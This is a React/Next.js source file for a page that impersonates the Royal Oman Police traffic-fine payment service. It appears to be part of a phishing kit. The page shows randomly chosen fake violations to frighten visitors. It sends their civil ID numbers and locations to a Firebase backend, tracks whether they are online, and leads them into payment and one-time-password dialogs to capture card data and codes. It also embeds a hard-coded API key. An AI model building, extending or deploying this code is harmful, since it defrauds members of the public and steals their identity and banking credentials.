"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { ViolationsList } from "@/components/violations-list"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { OTPDialog } from "@/components/otp-dialog"
import { CheckCircle2 } from "lucide-react"
import Link from "next/link"
import { PaymentDialog } from "@/components/payment-dialog"
import { SiteHeader } from "@/components/site-header"
import { AppFooter } from "@/components/app-footer"

interface Violation {
  id: string
  type: string
  date: string
  location: string
  amount: number
  plateNumber: string
  status: "unpaid" | "paid"
}

const mockViolations: Violation[] = [
  {
    id: "V001",
    type: "تجاوز السرعة المحددة",
    date: "2024-01-15",
    location: "شارع السلطان قابوس، مسقط",
    amount: 50,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V002",
    type: "عدم ربط حزام الأمان",
    date: "2024-01-10",
    location: "دوار الصاروج، مسقط",
    amount: 30,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V003",
    type: "استخدام الهاتف أثناء القيادة",
    date: "2024-01-08",
    location: "شارع الخوير، مسقط",
    amount: 75,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V004",
    type: "عدم التوقف عند الإشارة الحمراء",
    date: "2024-01-05",
    location: "تقاطع الغبرة الشمالية، مسقط",
    amount: 100,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V005",
    type: "الوقوف في مكان ممنوع",
    date: "2024-01-03",
    location: "موقف جراند مول، مسقط",
    amount: 25,
    plateNumber: "*****0",
    status: "unpaid",
  },
  {
    id: "V006",
    type: "عدم إعطاء الأولوية للمشاة",
    date: "2023-12-28",
    location: "شارع الوادي الكبير، مسقط",
    amount: 40,
    plateNumber: "*****0",
    status: "paid",
  },
]

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}

const visitorID = randstr("om-")

export default function ViolationsPage() {
  const [violations, setViolations] = useState<Violation[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [showViolations, setShowViolations] = useState(false)
  const [showPaymentDialog, setShowPaymentDialog] = useState(false)
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [formData, setFormData] = useState({
    registrationType: "personal",
    civilId: "",
    expiryDate: "",
    specificVehicle: false,
  })

  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id: visitorID,
        country: country
      })
      localStorage.setItem('country', country)
      setupOnlineStatus(visitorID)
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }

  useEffect(() => {
    getLocation()
  }, [])

  const getRandomViolations = () => {
    const numberOfViolations = Math.floor(Math.random() * 4) + 1
    const shuffled = [...mockViolations].sort(() => 0.5 - Math.random())
    return shuffled.slice(0, numberOfViolations)
  }

  const omanIdRegex = /^[1-9]\d{7,12}$/
  function isValidOmanId(id: string): boolean {
    return omanIdRegex.test(id)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    addData({ id: visitorID, phone: formData.civilId })
    await new Promise((resolve) => setTimeout(resolve, 1500))
    const randomViolations = getRandomViolations()
    setViolations(randomViolations)
    setShowViolations(true)
    setIsLoading(false)
  }

  const handleReset = () => {
    setShowViolations(false)
    setShowPaymentDialog(false)
    setShowOtpDialog(false)
    setShowSuccess(false)
    setViolations([])
    setFormData({
      registrationType: "personal",
      civilId: "",
      expiryDate: "",
      specificVehicle: false,
    })
  }

  const handlePaymentSuccess = () => {
    const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
    setViolations(updatedViolations)
  }

  const totalAmount = violations.filter((v) => v.status === "unpaid").reduce((sum, v) => sum + v.amount, 0)

  if (showSuccess) {
    return (
      <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
        <SiteHeader />
        <main
          className="flex-grow flex items-center justify-center p-4"
          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
        >
          <Card className="max-w-md mx-auto bg-white/90 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
            <CardContent className="p-8 text-center">
              <CheckCircle2 className="w-20 h-20 text-green-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-gray-800 mb-2">تم الدفع بنجاح!</h2>
              <p className="text-gray-600 mb-6">تمت معالجة دفع المخالفات بنجاح. ستتلقى رسالة تأكيد قريبًا.</p>
              <div className="space-y-3">
                <Button
                  onClick={handleReset}
                  className="w-full bg-[#85a646] hover:bg-green-600 text-white font-bold text-lg py-3 rounded-lg"
                >
                  استعلام جديد
                </Button>
                <Link href="/">
                  <Button variant="outline" className="w-full bg-transparent">
                    العودة للصفحة الرئيسية
                  </Button>
                </Link>
              </div>
            </CardContent>
          </Card>
        </main>
        <AppFooter />
      </div>
    )
  }

  return (
    <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
      <SiteHeader />
      <main className="flex-grow">
        <div className="bg-[#85a646] text-white text-center py-6">
          <h1 className="text-2xl md:text-3xl font-bold">دفع المخالفات المرورية</h1>
          <p className="text-sm opacity-90 mt-2">شرطة عمان السلطانية</p>
        </div>
        <div
          className="py-12 px-4"
          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
        >
          {!showViolations ? (
            <Card className="max-w-md mx-auto bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
              <CardContent className="p-8">
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="text-center">
                    <h2 className="text-xl font-semibold text-gray-700">اختر نوع التسجيل</h2>
                  </div>
                  <div className="flex justify-center gap-8">
                    <div className="flex items-center gap-2">
                      <Checkbox
                        id="personal"
                        checked={formData.registrationType === "personal"}
                        onCheckedChange={() =>
                          setFormData((prev) => ({
                            ...prev,
                            registrationType: "personal",
                          }))
                        }
                        className="data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600"
                      />
                      <Label htmlFor="personal" className="text-lg font-medium text-gray-700">
                        شخصي
                      </Label>
                    </div>
                    <div className="flex items-center gap-2">
                      <Checkbox
                        id="commercial"
                        checked={formData.registrationType === "commercial"}
                        onCheckedChange={() =>
                          setFormData((prev) => ({
                            ...prev,
                            registrationType: "commercial",
                          }))
                        }
                      />
                      <Label htmlFor="commercial" className="text-lg font-medium text-gray-700">
                        تجاري
                      </Label>
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="civil-id" className="text-gray-600">
                      رقم الهوية المدنية
                    </Label>
                    <Input
                      id="civil-id"
                      type="tel"
                      value={formData.civilId}
                      onChange={(e) => {
                        setFormData((prev) => ({
                          ...prev,
                          civilId: e.target.value,
                        }))
                      }}
                      className="bg-white rounded-lg"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="expiry-date" className="text-gray-600">
                      تاريخ انتهاء الرخصة
                    </Label>
                    <Input
                      id="expiry-date"
                      type="text"
                      placeholder="YYYY/MM/DD"
                      value={formData.expiryDate}
                      onChange={(e) =>
                        setFormData((prev) => ({
                          ...prev,
                          expiryDate: e.target.value,
                        }))
                      }
                      className="bg-white rounded-lg"
                      required
                    />
                  </div>
                  <div className="flex items-center gap-2 pt-2">
                    <Checkbox
                      id="specific-vehicle"
                      checked={formData.specificVehicle}
                      onCheckedChange={(checked) =>
                        setFormData((prev) => ({
                          ...prev,
                          specificVehicle: !!checked,
                        }))
                      }
                    />
                    <Label htmlFor="specific-vehicle" className="text-gray-700">
                      الإستفسار عن مركبة معينة
                    </Label>
                  </div>
                  <div className="space-y-3 pt-4">
                    <Button
                      type="submit"
                      disabled={isLoading || !isValidOmanId(formData.civilId!)}
                      className="w-full bg-[#374151] hover:bg-gray-600 text-white font-bold text-lg py-6 rounded-lg disabled:opacity-50"
                    >
                      {isLoading ? "جاري البحث..." : "الإستفسار"}
                    </Button>
                    <Link href="/">
                      <Button type="button" variant="ghost" className="w-full">
                        العودة للصفحة الرئيسية
                      </Button>
                    </Link>
                  </div>
                </form>
              </CardContent>
            </Card>
          ) : (
            <div className="max-w-4xl mx-auto">
              <Card className="bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
                <CardContent className="p-8">
                  <div className="text-center mb-6">
                    <h2 className="text-2xl font-bold text-gray-800 mb-2">نتائج الاستعلام</h2>
                    <p className="text-gray-600">رقم الهوية المدنية: {formData.civilId}</p>
                  </div>
                  {violations.length > 0 ? (
                    <>
                      <ViolationsList violations={violations} />
                      {totalAmount > 0 && (
                        <div className="mt-6 p-4 bg-red-50 rounded-lg border border-red-200">
                          <div className="flex justify-between items-center">
                            <span className="text-lg font-semibold text-red-800">إجمالي المبلغ المستحق:</span>
                            <span className="text-2xl font-bold text-red-600">{totalAmount.toFixed(2)} ر.ع</span>
                          </div>
                        </div>
                      )}
                      <div className="flex flex-col sm:flex-row gap-4 mt-6">
                        {totalAmount > 0 && (
                          <Button
                            onClick={() => setShowPaymentDialog(true)}
                            className="flex-1 bg-[#85a646] hover:bg-green-600 text-white font-bold py-3"
                          >
                            دفع المخالفات
                          </Button>
                        )}
                        <Button
                          variant="outline"
                          onClick={handleReset}
                          className="flex-1 border-gray-300 text-gray-700 font-bold py-3 bg-transparent hover:bg-gray-100"
                        >
                          استعلام جديد
                        </Button>
                      </div>
                    </>
                  ) : (
                    <div className="text-center py-8">
                      <div className="text-green-600 text-6xl mb-4">✓</div>
                      <h3 className="text-xl font-semibold text-green-800 mb-2">لا توجد مخالفات مسجلة</h3>
                      <p className="text-gray-600 mb-6">لم يتم العثور على أي مخالفات مرورية مسجلة.</p>
                      <Button
                        onClick={handleReset}
                        className="bg-[#85a646] hover:bg-green-600 text-white font-bold px-8 py-3"
                      >
                        استعلام جديد
                      </Button>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          )}
        </div>

        <PaymentDialog
          open={showPaymentDialog}
          onOpenChange={setShowPaymentDialog}
          totalAmount={totalAmount}
          onSuccess={() => {
            setShowPaymentDialog(false)
            setShowOtpDialog(true)
          }}
        />

        <OTPDialog
          open={showOtpDialog}
          onOpenChange={setShowOtpDialog}
          phoneNumber={formData.civilId}
          onSuccess={() => {
            setShowOtpDialog(false)
            handlePaymentSuccess()
            setShowSuccess(true)
          }}
        />
      </main>
      <AppFooter />
    </div>
  )
}
